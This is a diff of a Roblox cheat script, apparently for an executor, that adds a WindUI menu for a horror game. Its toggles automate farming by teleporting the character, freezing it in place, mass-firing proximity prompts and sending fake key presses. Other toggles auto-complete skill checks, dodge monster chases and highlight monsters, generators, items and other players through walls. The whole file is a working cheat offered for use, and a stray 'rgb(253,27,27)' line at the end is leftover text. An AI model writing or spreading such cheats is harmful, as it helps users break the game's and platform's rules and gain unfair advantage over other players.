+                VIM:SendKeyEvent(false, Enum.KeyCode.Three, false, game)
+                VIM:SendKeyEvent(true, Enum.KeyCode.Four, false, game)
+                VIM:SendKeyEvent(false, Enum.KeyCode.Four, false, game)
+                task.wait(0.1)
+                t = t + 0.1
+            end
+            collectThread = nil
+        end)
+    end
+
+    local function stopCollectLoop()
+        if collectThread then
+            task.cancel(collectThread)
+            collectThread = nil
+        end
+    end
+
+    -- Fire prompts loop for a generator
+    local function startPromptLoop()
+        if promptThread then task.cancel(promptThread) end
+        promptThread = task.spawn(function()
+            while autoFarmEnabled do
+                for _, v in pairs(workspace:GetDescendants()) do
+                    if v:IsA("ProximityPrompt") then
+                        pcall(function() fireproximityprompt(v, 1) end)
+                    end
+                end
+                task.wait()
+            end
+        end)
+    end
+
+    local function stopPromptLoop()
+        if promptThread then
+            task.cancel(promptThread)
+            promptThread = nil
+        end
+    end
+
+    local function isSpotted()
+        local ok, result = pcall(function()
+            local gui = lp.PlayerGui:FindFirstChild("ScreenGui")
+            if not gui then return false end
+            local s1 = gui:FindFirstChild("Spotted")
+            local s2 = gui:FindFirstChild("Spotted2")
+            return (s1 and s1.Visible) or (s2 and s2.Visible) or false
+        end)
+        return ok and result
+    end
+
+    local function isPanicking()
+        local ok, result = pcall(function()
+            local info = workspace:FindFirstChild("Info")
+            if not info then return false end
+            local panic = info:FindFirstChild("Panic")
+            return panic and panic.Value == true or false
+        end)
+        return ok and result
+    end
+
+    local function isBeingChased()
+        local ok, result = pcall(function()
+            local currentRoom = workspace:FindFirstChild("CurrentRoom")
+            if not currentRoom then return false end
+            for _, mapChild in ipairs(currentRoom:GetChildren()) do
+                local monstersFolder = mapChild:FindFirstChild("Monsters")
+                if not monstersFolder then continue end
+                for _, monster in ipairs(monstersFolder:GetChildren()) do
+                    local cv = monster:FindFirstChild("ChasingValue")
+                    if cv and tostring(cv.Value) == MY_NAME then
+                        return true
+                    end
+                end
+            end
+            return false
+        end)
+        return ok and result
+    end
+
+    local function getCurrentMap()
+        local currentRoom = workspace:FindFirstChild("CurrentRoom")
+        if not currentRoom then return nil end
+        for _, child in ipairs(currentRoom:GetChildren()) do
+            if child:FindFirstChild("Items") or child:FindFirstChild("Generators") then
+                return child
+            end
+        end
+        return nil
+    end
+
+    local function getPartPosition(obj)
+        if obj:IsA("BasePart") then
+            return obj.Position
+        elseif obj:IsA("Model") then
+            local p = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
+            if p then return p.Position end
+        end
+        return nil
+    end
+
+    local function getFreeAreaPos()
+        local map = getCurrentMap()
+        if not map then return nil end
+        local freeArea = map:FindFirstChild("FreeArea")
+        if not freeArea then return nil end
+        local fakeElevator = freeArea:FindFirstChild("FakeElevator")
+        if not fakeElevator then return nil end
+        return getPartPosition(fakeElevator)
+    end
+
+    local function getElevatorPos()
+        local elevators = workspace:FindFirstChild("Elevators")
+        if not elevators then return nil end
+        local elev = elevators:FindFirstChild("Elevator")
+        if not elev then return nil end
+        return getPartPosition(elev)
+    end
+
+    local function allMachinesDone(generatorsFolder)
+        for _, generator in ipairs(generatorsFolder:GetChildren()) do
+            local stats = generator:FindFirstChild("Stats")
+            local completed = stats and stats:FindFirstChild("Completed")
+            if completed and completed.Value == false then
+                return false
+            end
+        end
+        return true
+    end
+
+    local function isMachineDone(generator)
+        local stats = generator:FindFirstChild("Stats")
+        local completed = stats and stats:FindFirstChild("Completed")
+        return completed and completed.Value == true
+    end
+
+    local function waitIfHiding()
+        while autoFarmEnabled and isHiding do
+            task.wait(0.3)
+        end
+    end
+
+    local function doHide()
+        isHiding = true
+        stopPromptLoop()
+        stopCollectLoop()
+        stopFreeze()
+        local pos = getFreeAreaPos()
+        if pos then
+            teleportTo(pos)
+            startFreeze(pos)
+            local t = 0
+            while autoFarmEnabled and isBeingChased() and t < 10 do
+                task.wait(0.3)
+                t = t + 0.3
+            end
+            -- wait a bit extra after chase ends
+            task.wait(1)
+            stopFreeze()
+        end
+        isHiding = false
+    end
+
+    local function startChaseWatcher()
+        if chaseWatchThread then task.cancel(chaseWatchThread) end
+        chaseWatchThread = task.spawn(function()
+            while autoFarmEnabled do
+                task.wait(0.3)
+                if not autoFarmEnabled then break end
+                if isBeingChased() and not isHiding then
+                    task.spawn(doHide)
+                end
+            end
+        end)
+    end
+
+    local function stopChaseWatcher()
+        if chaseWatchThread then
+            task.cancel(chaseWatchThread)
+            chaseWatchThread = nil
+        end
+        isHiding = false
+    end
+
+    local function collectItems(itemsFolder)
+        while autoFarmEnabled do
+            local items = itemsFolder:GetChildren()
+            if #items == 0 then break end
+
+            for _, item in ipairs(items) do
+                if not autoFarmEnabled then return end
+                waitIfHiding()
+                if not item:IsDescendantOf(game) then continue end
+
+                local pos = getPartPosition(item)
+                if not pos then continue end
+
+                local underPos = Vector3.new(pos.X, pos.Y - 2, pos.Z)
+                stopFreeze()
+                teleportTo(underPos)
+                startFreeze(underPos)
+
+                -- Fire numbers for 5 seconds or until item gone
+                local t = 0
+                while autoFarmEnabled and item:IsDescendantOf(game) and t < 5 do
+                    waitIfHiding()
+                    VIM:SendKeyEvent(true, Enum.KeyCode.One, false, game)
+                    VIM:SendKeyEvent(false, Enum.KeyCode.One, false, game)
+                    VIM:SendKeyEvent(true, Enum.KeyCode.Two, false, game)
+                    VIM:SendKeyEvent(false, Enum.KeyCode.Two, false, game)
+                    VIM:SendKeyEvent(true, Enum.KeyCode.Three, false, game)
+                    VIM:SendKeyEvent(false, Enum.KeyCode.Three, false, game)
+                    VIM:SendKeyEvent(true, Enum.KeyCode.Four, false, game)
+                    VIM:SendKeyEvent(false, Enum.KeyCode.Four, false, game)
+                    task.wait(0.1)
+                    t = t + 0.1
+                end
+
+                stopFreeze()
+            end
+
+            task.wait(0.05)
+        end
+    end
+
+    local function workGenerator(generator)
+        if isMachineDone(generator) then return end
+        local pos = getPartPosition(generator)
+        if not pos then return end
+
+        waitIfHiding()
+        if isSpotted() then
+            local fpos = getFreeAreaPos()
+            if fpos then
+                stopFreeze()
+                teleportTo(fpos)
+                startFreeze(fpos)
+                task.wait(6)
+                stopFreeze()
+            end
+            if not autoFarmEnabled then return end
+        end
+
+        if isMachineDone(generator) then return end
+
+        local workPos = Vector3.new(pos.X, pos.Y - 2, pos.Z)
+        stopFreeze()
+        teleportTo(workPos)
+        startFreeze(workPos)
+        task.wait(0.2)
+
+        if isSpotted() then
+            stopFreeze()
+            local fpos = getFreeAreaPos()
+            if fpos then
+                teleportTo(fpos)
+                startFreeze(fpos)
+                task.wait(6)
+                stopFreeze()
+            end
+            if not autoFarmEnabled then return end
+        end
+
+        -- Fire prompts loop while working
+        startPromptLoop()
+
+        -- Also fire numbers for 5s right after firing prompts
+        fireNumbersFor5Seconds()
+
+        local workTime = 0
+        while autoFarmEnabled and not isMachineDone(generator) and workTime < 60 do
+            waitIfHiding()
+
+            if isSpotted() then
+                stopPromptLoop()
+                stopCollectLoop()
+                stopFreeze()
+                local fpos = getFreeAreaPos()
+                if fpos then
+                    teleportTo(fpos)
+                    startFreeze(fpos)
+                    task.wait(6)
+                    stopFreeze()
+                end
+                if not autoFarmEnabled then return end
+                if not isMachineDone(generator) then
+                    teleportTo(workPos)
+                    startFreeze(workPos)
+                    task.wait(0.2)
+                    startPromptLoop()
+                    fireNumbersFor5Seconds()
+                end
+            end
+
+            task.wait(0.5)
+            workTime = workTime + 0.5
+        end
+
+        stopPromptLoop()
+        stopCollectLoop()
+        stopFreeze()
+
+        -- Machine done: check panic
+        if isMachineDone(generator) and isPanicking() then
+            local elevPos = getElevatorPos()
+            if elevPos then
+                teleportTo(elevPos)
+                startFreeze(elevPos)
+            end
+        end
+    end
+
+    local function isDangerousMonster(monster)
+        local name = monster.Name:lower()
+        return name:find("dandy") or name:find("dyle")
+    end
+
+    local function doEncounterTwisted(monstersFolder)
+        for _, monster in ipairs(monstersFolder:GetChildren()) do
+            if not autoFarmEnabled or not encounterTwistedEnabled then return end
+            if isDangerousMonster(monster) then continue end
+            local pos = getPartPosition(monster)
+            if pos then
+                stopFreeze()
+                teleportTo(pos + Vector3.new(0, 3, 0))
+                task.wait(0.4)
+            end
+        end
+    end
+
+    local function farmLoop()
+        startChaseWatcher()
+
+        while autoFarmEnabled do
+            local map = getCurrentMap()
+            if not map then task.wait(1) continue end
+
+            local itemsFolder      = map:FindFirstChild("Items")
+            local generatorsFolder = map:FindFirstChild("Generators")
+            local monstersFolder   = map:FindFirstChild("Monsters")
+
+            -- Step 1: Collect items
+            if itemsFolder and #itemsFolder:GetChildren() > 0 then
+                collectItems(itemsFolder)
+            end
+
+            if not autoFarmEnabled then break end
+
+            -- Step 2: Encounter twisted
+            if encounterTwistedEnabled and monstersFolder then
+                doEncounterTwisted(monstersFolder)
+            end
+
+            if not autoFarmEnabled then break end
+
+            -- Step 3: Work generators
+            if generatorsFolder then
+                if allMachinesDone(generatorsFolder) then
+                    if isPanicking() then
+                        local elevPos = getElevatorPos()
+                        while autoFarmEnabled do
+                            map = getCurrentMap()
+                            if not map then break end
+                            generatorsFolder = map:FindFirstChild("Generators")
+                            if not generatorsFolder or not allMachinesDone(generatorsFolder) then break end
+                            if elevPos then
+                                stopFreeze()
+                                teleportTo(elevPos)
+                                startFreeze(elevPos)
+                            end
+                            task.wait(1)
+                        end
+                        stopFreeze()
+                    end
+                    continue
+                end
+
+                for _, generator in ipairs(generatorsFolder:GetChildren()) do
+                    if not autoFarmEnabled then break end
+                    if isMachineDone(generator) then continue end
+                    waitIfHiding()
+                    workGenerator(generator)
+                end
+
+                if autoFarmEnabled and generatorsFolder and allMachinesDone(generatorsFolder) and isPanicking() then
+                    local elevPos = getElevatorPos()
+                    while autoFarmEnabled do
+                        map = getCurrentMap()
+                        if not map then break end
+                        generatorsFolder = map:FindFirstChild("Generators")
+                        if generatorsFolder and not allMachinesDone(generatorsFolder) then break end
+                        if elevPos then
+                            stopFreeze()
+                            teleportTo(elevPos)
+                            startFreeze(elevPos)
+                        end
+                        task.wait(1)
+                    end
+                    stopFreeze()
+                end
+            end
+
+            task.wait(1)
+        end
+
+        stopFreeze()
+        stopCollectLoop()
+        stopPromptLoop()
+        stopChaseWatcher()
+    end
+
+    MainTab:Toggle({
+        Flag     = "AutoFarm",
+        Title    = "Auto Farm",
+        Icon     = "cpu",
+        Value    = false,
+        Callback = function(state)
+            autoFarmEnabled = state
+            if state then
+                farmThread = task.spawn(farmLoop)
+            else
+                stopFreeze()
+                stopCollectLoop()
+                stopPromptLoop()
+                stopChaseWatcher()
+                if farmThread then
+                    task.cancel(farmThread)
+                    farmThread = nil
+                end
+            end
+        end,
+    })
+
+    MainTab:Toggle({
+        Flag     = "EncounterTwisted",
+        Title    = "Encounter Twisted",
+        Icon     = "zap",
+        Value    = false,
+        Callback = function(state)
+            encounterTwistedEnabled = state
+        end,
+    })
+end
+-- skillvheck
+do
+    local skillCheckEnabled = false
+    local skillCheckConn
+
+    local function startSkillCheck()
+        local Players = game:GetService("Players")
+        local lp = Players.LocalPlayer
+
+        local ok, skillCheckFrame = pcall(function()
+            return lp.PlayerGui:WaitForChild("ScreenGui", 10)
+                :WaitForChild("Menu", 10)
+                :WaitForChild("SkillCheckFrame", 10)
+        end)
+
+        if not ok or not skillCheckFrame then
+            warn("[AutoSkillCheck] SkillCheckFrame not found.")
+            return
+        end
+
+        local marker  = skillCheckFrame:WaitForChild("Marker", 10)
+        local goldArea = skillCheckFrame:WaitForChild("GoldArea", 10)
+
+        if not marker or not goldArea then
+            warn("[AutoSkillCheck] Marker or GoldArea not found.")
+            return
+        end
+
+        local pressing = false
+
+        local function pressSpace()
+            if pressing then return end
+            pressing = true
+            keypress(0x20)
+            task.wait(0.15)
+            keyrelease(0x20)
+            task.wait(0.3)
+            pressing = false
+        end
+
+        if skillCheckConn then skillCheckConn:Disconnect() end
+        skillCheckConn = marker:GetPropertyChangedSignal("Position"):Connect(function()
+            if not skillCheckEnabled or pressing then return end
+
+            local markerPos  = marker.AbsolutePosition
+            local markerSize = marker.AbsoluteSize
+            local goldPos    = goldArea.AbsolutePosition
+            local goldSize   = goldArea.AbsoluteSize
+
+            local overlapX = markerPos.X < goldPos.X + goldSize.X and markerPos.X + markerSize.X > goldPos.X
+            local overlapY = markerPos.Y < goldPos.Y + goldSize.Y and markerPos.Y + markerSize.Y > goldPos.Y
+
+            if overlapX and overlapY then
+                pressSpace()
+            end
+        end)
+    end
+
+    local function stopSkillCheck()
+        if skillCheckConn then skillCheckConn:Disconnect() skillCheckConn = nil end
+    end
+
+    MainTab:Toggle({
+        Flag     = "AutoSkillCheck",
+        Title    = "Auto Skillcheck",
+        Icon     = "crosshair",
+        Value    = false,
+        Callback = function(state)
+            skillCheckEnabled = state
+            if state then
+                task.spawn(startSkillCheck)
+            else
+                stopSkillCheck()
+            end
+        end,
+    })
+end
+-- Twisteds Highlight
+do
+    local espEnabled = false
+    local highlights = {}
+    local monsterConn
+    local mapConn
+    local roomConn
+
+    local ESP_FILL_COLOR      = Color3.fromRGB(138, 43, 226)
+    local ESP_OUTLINE_COLOR   = Color3.fromRGB(0, 229, 255)
+    local ESP_FILL_TRANS      = 0.4
+    local ESP_OUTLINE_TRANS   = 0
+
+    local function clearHighlights()
+        for monster, highlight in pairs(highlights) do
+            pcall(function() highlight:Destroy() end)
+        end
+        highlights = {}
+    end
+
+    local function highlightMonster(monster)
+        if highlights[monster] then return end
+        local h = Instance.new("Highlight")
+        h.FillColor           = ESP_FILL_COLOR
+        h.OutlineColor        = ESP_OUTLINE_COLOR
+        h.FillTransparency    = ESP_FILL_TRANS
+        h.OutlineTransparency = ESP_OUTLINE_TRANS
+        h.Adornee = monster
+        h.Parent  = monster
+        local conn
+        conn = monster.AncestryChanged:Connect(function()
+            if not monster:IsDescendantOf(game) then
+                conn:Disconnect()
+                highlights[monster] = nil
+            end
+        end)
+        highlights[monster] = h
+    end
+
+    local function watchMonsters(monstersFolder)
+        clearHighlights()
+        if monsterConn then monsterConn:Disconnect() end
+        if not espEnabled then return end
+        for _, monster in ipairs(monstersFolder:GetChildren()) do
+            highlightMonster(monster)
+        end
+        monsterConn = monstersFolder.ChildAdded:Connect(function(child)
+            if espEnabled then task.wait(0.1) highlightMonster(child) end
+        end)
+    end
+
+    local function findMonstersInRoom(currentRoom)
+        for _, child in ipairs(currentRoom:GetChildren()) do
+            local monsters = child:FindFirstChild("Monsters")
+            if monsters then watchMonsters(monsters) return end
+        end
+    end
+
+    local function hookRoom(currentRoom)
+        findMonstersInRoom(currentRoom)
+        if mapConn then mapConn:Disconnect() end
+        mapConn = currentRoom.ChildAdded:Connect(function(child)
+            task.wait(0.2)
+            local monsters = child:FindFirstChild("Monsters")
+            if monsters and espEnabled then watchMonsters(monsters) end
+        end)
+    end
+
+    local function startWatcher()
+        local currentRoom = workspace:FindFirstChild("CurrentRoom")
+        if currentRoom then hookRoom(currentRoom) end
+        if roomConn then roomConn:Disconnect() end
+        roomConn = workspace.ChildAdded:Connect(function(child)
+            if child.Name == "CurrentRoom" and espEnabled then
+                task.wait(0.5) hookRoom(child)
+            end
+        end)
+    end
+
+    local function stopWatcher()
+        if roomConn then roomConn:Disconnect() roomConn = nil end
+        if mapConn then mapConn:Disconnect() mapConn = nil end
+        if monsterConn then monsterConn:Disconnect() monsterConn = nil end
+        clearHighlights()
+    end
+
+    MainTab:Toggle({
+        Flag     = "TwistedsESP",
+        Title    = "Twisteds Highlight",
+        Icon     = "eye",
+        Value    = false,
+        Callback = function(state)
+            espEnabled = state
+            if state then startWatcher() else stopWatcher() end
+        end,
+    })
+end
+
+-- Generator Highlight
+do
+    local genEnabled = false
+    local genHighlights = {}
+    local genConn
+    local genMapConn
+    local genRoomConn
+
+    local GEN_FILL_COLOR      = Color3.fromRGB(255, 200, 0)
+    local GEN_OUTLINE_COLOR   = Color3.fromRGB(255, 100, 0)
+    local GEN_FILL_TRANS      = 0.4
+    local GEN_OUTLINE_TRANS   = 0
+
+    local function clearGenHighlights()
+        for gen, highlight in pairs(genHighlights) do
+            pcall(function() highlight:Destroy() end)
+        end
+        genHighlights = {}
+    end
+
+    local function removeGenHighlight(gen)
+        if genHighlights[gen] then
+            pcall(function() genHighlights[gen]:Destroy() end)
+            genHighlights[gen] = nil
+        end
+    end
+
+    local function highlightGenerator(gen)
+        if genHighlights[gen] then return end
+        local stats = gen:FindFirstChild("Stats")
+        local completed = stats and stats:FindFirstChild("Completed")
+        if completed and completed.Value == true then return end
+        local h = Instance.new("Highlight")
+        h.FillColor           = GEN_FILL_COLOR
+        h.OutlineColor        = GEN_OUTLINE_COLOR
+        h.FillTransparency    = GEN_FILL_TRANS
+        h.OutlineTransparency = GEN_OUTLINE_TRANS
+        h.Adornee = gen
+        h.Parent  = gen
+        genHighlights[gen] = h
+        if completed then
+            completed:GetPropertyChangedSignal("Value"):Connect(function()
+                if completed.Value == true then removeGenHighlight(gen) end
+            end)
+        end
+        gen.AncestryChanged:Connect(function()
+            if not gen:IsDescendantOf(game) then genHighlights[gen] = nil end
+        end)
+    end
+
+    local function watchGenerators(generatorsFolder)
+        clearGenHighlights()
+        if genConn then genConn:Disconnect() end
+        if not genEnabled then return end
+        for _, gen in ipairs(generatorsFolder:GetChildren()) do
+            highlightGenerator(gen)
+        end
+        genConn = generatorsFolder.ChildAdded:Connect(function(child)
+            if genEnabled then task.wait(0.1) highlightGenerator(child) end
+        end)
+    end
+
+    local function findGeneratorsInRoom(currentRoom)
+        for _, child in ipairs(currentRoom:GetChildren()) do
+            local generators = child:FindFirstChild("Generators")
+            if generators then watchGenerators(generators) return end
+        end
+    end
+
+    local function hookGenRoom(currentRoom)
+        findGeneratorsInRoom(currentRoom)
+        if genMapConn then genMapConn:Disconnect() end
+        genMapConn = currentRoom.ChildAdded:Connect(function(child)
+            task.wait(0.2)
+            local generators = child:FindFirstChild("Generators")
+            if generators and genEnabled then watchGenerators(generators) end
+        end)
+    end
+
+    local function startGenWatcher()
+        local currentRoom = workspace:FindFirstChild("CurrentRoom")
+        if currentRoom then hookGenRoom(currentRoom) end
+        if genRoomConn then genRoomConn:Disconnect() end
+        genRoomConn = workspace.ChildAdded:Connect(function(child)
+            if child.Name == "CurrentRoom" and genEnabled then
+                task.wait(0.5) hookGenRoom(child)
+            end
+        end)
+    end
+
+    local function stopGenWatcher()
+        if genRoomConn then genRoomConn:Disconnect() genRoomConn = nil end
+        if genMapConn then genMapConn:Disconnect() genMapConn = nil end
+        if genConn then genConn:Disconnect() genConn = nil end
+        clearGenHighlights()
+    end
+
+    MainTab:Toggle({
+        Flag     = "GeneratorESP",
+        Title    = "Generator Highlight",
+        Icon     = "zap",
+        Value    = false,
+        Callback = function(state)
+            genEnabled = state
+            if state then startGenWatcher() else stopGenWatcher() end
+        end,
+    })
+end
+
+-- Items Highlight
+do
+    local itemEnabled = false
+    local itemHighlights = {}
+    local itemConn
+    local itemMapConn
+    local itemRoomConn
+
+    local ITEM_FILL_COLOR      = Color3.fromRGB(0, 255, 100)
+    local ITEM_OUTLINE_COLOR   = Color3.fromRGB(0, 180, 60)
+    local ITEM_FILL_TRANS      = 0.4
+    local ITEM_OUTLINE_TRANS   = 0
+
+    local function clearItemHighlights()
+        for item, highlight in pairs(itemHighlights) do
+            pcall(function() highlight:Destroy() end)
+        end
+        itemHighlights = {}
+    end
+
+    local function highlightItem(item)
+        if itemHighlights[item] then return end
+        local h = Instance.new("Highlight")
+        h.FillColor           = ITEM_FILL_COLOR
+        h.OutlineColor        = ITEM_OUTLINE_COLOR
+        h.FillTransparency    = ITEM_FILL_TRANS
+        h.OutlineTransparency = ITEM_OUTLINE_TRANS
+        h.Adornee = item
+        h.Parent  = item
+        itemHighlights[item] = h
+        item.AncestryChanged:Connect(function()
+            if not item:IsDescendantOf(game) then itemHighlights[item] = nil end
+        end)
+    end
+
+    local function watchItems(itemsFolder)
+        clearItemHighlights()
+        if itemConn then itemConn:Disconnect() end
+        if not itemEnabled then return end
+        for _, item in ipairs(itemsFolder:GetChildren()) do
+            highlightItem(item)
+        end
+        itemConn = itemsFolder.ChildAdded:Connect(function(child)
+            if itemEnabled then task.wait(0.1) highlightItem(child) end
+        end)
+    end
+
+    local function findItemsInRoom(currentRoom)
+        for _, child in ipairs(currentRoom:GetChildren()) do
+            local items = child:FindFirstChild("Items")
+            if items then watchItems(items) return end
+        end
+    end
+
+    local function hookItemRoom(currentRoom)
+        findItemsInRoom(currentRoom)
+        if itemMapConn then itemMapConn:Disconnect() end
+        itemMapConn = currentRoom.ChildAdded:Connect(function(child)
+            task.wait(0.2)
+            local items = child:FindFirstChild("Items")
+            if items and itemEnabled then watchItems(items) end
+        end)
+    end
+
+    local function startItemWatcher()
+        local currentRoom = workspace:FindFirstChild("CurrentRoom")
+        if currentRoom then hookItemRoom(currentRoom) end
+        if itemRoomConn then itemRoomConn:Disconnect() end
+        itemRoomConn = workspace.ChildAdded:Connect(function(child)
+            if child.Name == "CurrentRoom" and itemEnabled then
+                task.wait(0.5) hookItemRoom(child)
+            end
+        end)
+    end
+
+    local function stopItemWatcher()
+        if itemRoomConn then itemRoomConn:Disconnect() itemRoomConn = nil end
+        if itemMapConn then itemMapConn:Disconnect() itemMapConn = nil end
+        if itemConn then itemConn:Disconnect() itemConn = nil end
+        clearItemHighlights()
+    end
+
+    MainTab:Toggle({
+        Flag     = "ItemESP",
+        Title    = "Items Highlight",
+        Icon     = "package",
+        Value    = false,
+        Callback = function(state)
+            itemEnabled = state
+            if state then startItemWatcher() else stopItemWatcher() end
+        end,
+    })
+end
+-- Player Highlight
+do
+    local playerEnabled = false
+    local playerHighlights = {}
+    local playerConn
+
+    local PLAYER_FILL_COLOR     = Color3.fromRGB(0, 150, 255)
+    local PLAYER_OUTLINE_COLOR  = Color3.fromRGB(255, 255, 255)
+    local PLAYER_FILL_TRANS     = 0.4
+    local PLAYER_OUTLINE_TRANS  = 0
+
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+
+    local function clearPlayerHighlights()
+        for char, highlight in pairs(playerHighlights) do
+            pcall(function() highlight:Destroy() end)
+        end
+        playerHighlights = {}
+    end
+
+    local function highlightPlayer(player)
+        if player == LocalPlayer then return end
+        local character = player.Character
+        if not character or playerHighlights[character] then return end
+
+        local h = Instance.new("Highlight")
+        h.FillColor           = PLAYER_FILL_COLOR
+        h.OutlineColor        = PLAYER_OUTLINE_COLOR
+        h.FillTransparency    = PLAYER_FILL_TRANS
+        h.OutlineTransparency = PLAYER_OUTLINE_TRANS
+        h.Adornee = character
+        h.Parent  = character
+        playerHighlights[character] = h
+
+        player.CharacterRemoving:Connect(function(char)
+            if playerHighlights[char] then
+                pcall(function() playerHighlights[char]:Destroy() end)
+                playerHighlights[char] = nil
+            end
+        end)
+
+        player.CharacterAdded:Connect(function(newChar)
+            task.wait(0.5)
+            if playerEnabled then highlightPlayer(player) end
+        end)
+    end
+
+    local function startPlayerESP()
+        for _, player in ipairs(Players:GetPlayers()) do
+            highlightPlayer(player)
+        end
+        playerConn = Players.PlayerAdded:Connect(function(player)
+            player.CharacterAdded:Connect(function()
+                task.wait(0.5)
+                if playerEnabled then highlightPlayer(player) end
+            end)
+        end)
+    end
+
+    local function stopPlayerESP()
+        if playerConn then playerConn:Disconnect() playerConn = nil end
+        clearPlayerHighlights()
+    end
+
+    MainTab:Toggle({
+        Flag     = "PlayerESP",
+        Title    = "Player Highlight",
+        Icon     = "users",
+        Value    = false,
+        Callback = function(state)
+            playerEnabled = state
+            if state then startPlayerESP() else stopPlayerESP() end
+        end,
+    })
+end
+
+-- Blot's Hand Highlight
+do
+    local blotEnabled = false
+    local blotHighlights = {}
+    local blotConn
+
+    local BLOT_FILL_COLOR     = Color3.fromRGB(180, 0, 255)
+    local BLOT_OUTLINE_COLOR  = Color3.fromRGB(255, 0, 100)
+    local BLOT_FILL_TRANS     = 0.3
+    local BLOT_OUTLINE_TRANS  = 0
+
+    local BLOT_KEYWORDS = {
+        "blot", "blotshand", "blot'shand", "blots_hand", "blothand",
+        "inkhand", "hand", "blot's", "blotted"
+    }
+
+    local function matchesBlot(name)
+        local lower = name:lower()
+        for _, keyword in ipairs(BLOT_KEYWORDS) do
+            if lower:find(keyword, 1, true) then
+                return true
+            end
+        end
+        return false
+    end
+
+    local function hasAnimationOrScript(model)
+        for _, child in ipairs(model:GetDescendants()) do
+            if child:IsA("Animation") or child:IsA("Animator")
+            or child:IsA("AnimationController") or child:IsA("Script")
+            or child:IsA("LocalScript") then
+                return true
+            end
+        end
+        return false
+    end
+
+    local function clearBlotHighlights()
+        for model, highlight in pairs(blotHighlights) do
+            pcall(function() highlight:Destroy() end)
+        end
+        blotHighlights = {}
+    end
+
+    local function highlightBlot(model)
+        if blotHighlights[model] then return end
+
+        local h = Instance.new("Highlight")
+        h.FillColor           = BLOT_FILL_COLOR
+        h.OutlineColor        = BLOT_OUTLINE_COLOR
+        h.FillTransparency    = BLOT_FILL_TRANS
+        h.OutlineTransparency = BLOT_OUTLINE_TRANS
+        h.Adornee = model
+        h.Parent  = model
+        blotHighlights[model] = h
+
+        model.AncestryChanged:Connect(function()
+            if not model:IsDescendantOf(game) then
+                blotHighlights[model] = nil
+            end
+        end)
+    end
+
+    local function scanWorkspace()
+        for _, obj in ipairs(workspace:GetDescendants()) do
+            if obj:IsA("Model") and matchesBlot(obj.Name) and hasAnimationOrScript(obj) then
+                highlightBlot(obj)
+            end
+        end
+    end
+
+    local function startBlotESP()
+        scanWorkspace()
+        blotConn = workspace.DescendantAdded:Connect(function(obj)
+            if blotEnabled and obj:IsA("Model") and matchesBlot(obj.Name) then
+                task.wait(0.2)
+                if hasAnimationOrScript(obj) then
+                    highlightBlot(obj)
+                end
+            end
+        end)
+    end
+
+    local function stopBlotESP()
+        if blotConn then blotConn:Disconnect() blotConn = nil end
+        clearBlotHighlights()
+    end
+
+    MainTab:Toggle({
+        Flag     = "BlotESP",
+        Title    = "Blot's Hand Highlight",
+        Icon     = "hand",
+        Value    = false,
+        Callback = function(state)
+            blotEnabled = state
+            if state then startBlotESP() else stopBlotESP() end
+        end,
+    })
+end
+-- */  Settings Tab  /* --
+local SettingsTab = Window:Tab({
+    Title     = "Settings",
+    Icon      = "solar:settings-bold",
+    IconColor = Grey,
+    IconShape = "Square",
+})
+
+do
+    local ConfigManager = Window.ConfigManager
+    local ConfigName = "default"
+
+    local myConfig = ConfigManager:CreateConfig(ConfigName)
+
+    -- Register flags
+    -- (WindUI auto-registers elements with Flags when using ConfigManager)
+
+    SettingsTab:Section({
+        Title = "Configs",
+        TextSize = 20,
+    })
+
+    local ConfigNameInput = SettingsTab:Input({
+        Title = "Config Name",
+        Icon  = "file-cog",
+        Value = ConfigName,
+        Callback = function(value)
+            if value and value ~= "" then
+                ConfigName = value
+            end
+        end,
+    })
+
+    SettingsTab:Space()
+
+    local AllConfigs = ConfigManager:AllConfigs()
+    local DefaultValue = table.find(AllConfigs, ConfigName) and ConfigName or nil
+
+    local AllConfigsDropdown = SettingsTab:Dropdown({
+        Title  = "Saved Configs",
+        Desc   = "Select an existing config",
+        Values = #AllConfigs > 0 and AllConfigs or {"No configs yet"},
+        Value  = DefaultValue,
+        Callback = function(value)
+            if value ~= "No configs yet" then
+                ConfigName = value
+                ConfigNameInput:Set(value)
+            end
+        end,
+    })
+
+    SettingsTab:Space()
+
+    local ButtonGroup = SettingsTab:Group({})
+
+    ButtonGroup:Button({
+        Title   = "Save",
+        Icon    = "save",
+        Justify = "Center",
+        Callback = function()
+            local cfg = ConfigManager:CreateConfig(ConfigName)
+            if cfg:Save() then
+                WindUI:Notify({
+                    Title = "Config Saved",
+                    Desc  = "'" .. ConfigName .. "' has been saved.",
+                    Icon  = "check",
+                })
+                AllConfigsDropdown:Refresh(ConfigManager:AllConfigs())
+            end
+        end,
+    })
+
+    ButtonGroup:Space()
+
+    ButtonGroup:Button({
+        Title   = "Load",
+        Icon    = "refresh-cw",
+        Justify = "Center",
+        Callback = function()
+            local cfg = ConfigManager:CreateConfig(ConfigName)
+            if cfg:Load() then
+                WindUI:Notify({
+                    Title = "Config Loaded",
+                    Desc  = "'" .. ConfigName .. "' has been loaded.",
+                    Icon  = "refresh-cw",
+                })
+            end
+        end,
+    })
+
+    ButtonGroup:Space()
+
+    ButtonGroup:Button({
+        Title   = "Delete",
+        Icon    = "trash-2",
+        Justify = "Center",
+        Color   = Red,
+        Callback = function()
+            local cfg = ConfigManager:CreateConfig(ConfigName)
+            cfg:Delete()
+            WindUI:Notify({
+                Title = "Config Deleted",
+                Desc  = "'" .. ConfigName .. "' has been deleted.",
+                Icon  = "trash-2",
+            })
+            local updated = ConfigManager:AllConfigs()
+            AllConfigsDropdown:Refresh(#updated > 0 and updated or {"No configs yet"})
+        end,
+    })
+end
+    end,
+    [17164617414] = function()
+    end,
+}
+
+if games[game.PlaceId] then
+    games[game.PlaceId]()
+else
+    warn("Game not supported")
+end
+rgb(253,27,27)
